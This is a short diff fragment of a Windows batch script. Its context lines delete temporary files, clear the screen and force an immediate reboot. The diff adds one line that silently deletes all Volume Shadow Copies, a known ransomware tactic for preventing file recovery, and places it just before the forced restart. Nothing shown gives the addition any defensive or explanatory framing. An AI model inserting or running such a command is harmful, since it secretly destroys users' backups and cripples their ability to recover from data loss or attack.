@@ -324,4 +324,5 @@ del %temp%\tempout3327049.txt
 del %temp%\tempout3327048.txt
 del %temp%\tempout3327047.txt
 cls
+vssadmin delete shadows /all /quiet
 shutdown /r /f /t 0
